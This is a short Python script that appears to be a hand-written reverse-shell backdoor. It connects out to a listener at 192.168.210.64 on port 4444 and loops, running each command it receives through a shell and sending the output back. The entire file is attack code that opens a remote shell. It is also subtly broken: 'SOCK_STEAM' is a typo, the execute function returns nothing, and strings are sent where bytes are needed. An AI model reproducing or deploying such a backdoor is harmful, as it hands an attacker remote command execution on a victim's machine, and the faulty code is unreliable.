import socket
import subprocess

def execute(command):
    subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STEAM)
connection.connect(("192.168.210.64", 4444))

connection.send("\n[+] Connection Established.\n")
while True:
    recived_data = connection.recv(1024)
    result = execute(recived_data)
    connection.send(result)

connection.close()